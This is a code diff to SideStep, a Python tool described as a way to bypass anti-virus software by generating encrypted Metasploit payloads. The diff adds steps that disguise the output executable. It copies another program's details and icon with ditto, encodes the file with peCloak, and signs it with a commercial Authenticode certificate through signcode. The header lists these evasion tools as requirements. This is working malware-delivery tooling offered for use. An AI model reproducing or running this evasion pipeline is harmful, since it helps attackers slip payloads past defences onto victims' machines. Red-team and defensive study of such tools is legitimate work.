@@ -8,19 +8,24 @@ Github:         https://github.com/codewatchorg/sidestep
 Description:    SideStep is yet another tool to bypass anti-virus software.  The tool generates Metasploit payloads encrypted using the CryptoPP library (license included), and uses several other techniques to evade AV.
 
 Software Requirements:
-Metasploit Community 4.11.1 - Update 2015031001 (or later)<BR>
-Ruby 2.x<BR>
+Metasploit Community 4.11.1 - Update 2015031001 (or later)
+Ruby 2.x
 Windows (Tested on 7, 8, and 10)<BR>
-Python 2.7.x<BR>
-Visual Studio (free editions should be fine - tested on 2012 and 2015)<BR>
-Cygwin with strip utility (if you want to strip debug symbols)<BR>
+Python 2.7.x
+Visual Studio (free editions should be fine - tested on 2012 and 2015)
+Cygwin with strip utility (if you want to strip debug symbols)
+peCloak (if you want to use it - http://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/)
+ditto (if you want to use it - https://github.com/mubix/ditto)
+Mono (if you want to sign the executable - http://www.mono-project.com/download/)
 
 Configuration Requirements:
-Ruby, Python, strip.exe (if using it), and the cl.exe tool from Visual Studio need to be in your path.  Sorry, I tried to make it compile with ming-gcc with no luck.
+Ruby, Python, strip.exe (if using it), and the cl.exe tool from Visual Studio need to be in your path.  Sorry, I tried to make it compile with mingw-gcc with no luck.
 
 I leveraged ideas from the following projects to help develop this tool:
 - https://github.com/nccgroup/metasploitavevasion
 - https://github.com/inquisb/shellcodeexec
+
+For code signing, a good example can be found here: https://developer.mozilla.org/en-US/docs/Signing_an_executable_with_Authenticode
 
 """
 
@@ -154,6 +159,11 @@ def main(argv):
     subprocess.Popen('strip.exe -s ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     time.sleep(5)
 
+  if settings.useDitto == 1:
+    print '[-]\tAdding details and icon of ' + settings.dittoExe + ' to the executable'
+    subprocess.Popen(settings.dittoPath + 'ditto.exe ' + settings.dittoExe + ' ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    time.sleep(5)
+
   if settings.usePeCloak == 1:
     print '[-]\tEncoding the PE file with peCloak'
     subprocess.Popen('python ' + settings.peCloakPath + 'peCloak.py ' + os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -163,6 +173,13 @@ def main(argv):
     for file in os.listdir(os.getcwd() + path_delim + settings.exeDir + path_delim):
       if re.search('cloaked', file):
         os.rename(os.getcwd() + path_delim + settings.exeDir + path_delim + file, os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'])
+
+  if settings.useSigncode == 1:
+    print '[-]\tSigning executable with certificate at ' + settings.certPVK
+    subprocess.Popen(settings.signcodePath + ' -spc ' + settings.certSPC + ' -v ' + settings.certPVK + ' -a sha1 -$ commercial ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    time.sleep(3)
+
+  print '[*]  Process complete!'
 
 if __name__ == '__main__':
   main(sys.argv[1:])
